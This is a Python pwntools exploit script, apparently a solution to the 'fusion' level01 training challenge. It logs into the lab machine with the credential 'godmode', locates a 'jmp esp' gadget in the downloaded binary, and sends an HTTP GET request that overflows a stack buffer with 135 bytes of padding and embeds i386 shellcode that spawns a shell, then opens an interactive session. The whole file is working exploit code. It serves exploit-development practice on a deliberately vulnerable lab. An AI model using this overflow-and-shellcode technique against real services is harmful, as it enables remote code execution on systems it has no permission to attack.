__author__ = '@tomereyz'

from pwn import *

context.clear(arch='i386')


def main(download):
    challenge_series = 'fusion'
    challenge_name = 'level01'
    challenge_port = 20001
    ssh_client = ssh(user=challenge_series, host=challenge_series, password='godmode')
    if download:
        ssh_client.download('/opt/fusion/bin/{}'.format(challenge_name))

    e = ELF(challenge_name)

    r = remote(host=challenge_series, port=challenge_port)
    overflow = 135  # /tmp/cyclic(150) -> cyclic_find(0x61616a62) -> 135
    http_method = 'GET'
    http_protocol = 'HTTP/1.1'

    gadget_jmp_esp = next(e.search(asm('jmp esp')))
    get_path = '/tmp/' + cyclic(overflow) + pack(gadget_jmp_esp, word_size=32) + asm('jmp esi')

    shell_code = asm(shellcraft.i386.linux.sh())

    payload = ' '.join([http_method, get_path, http_protocol + shell_code])

    log.info("Now is the time to attach with gdb ;-)")
    pause()
    log.info(payload)
    r.sendline(payload)
    r.interactive()


if __name__ == '__main__':
    main(download=True)
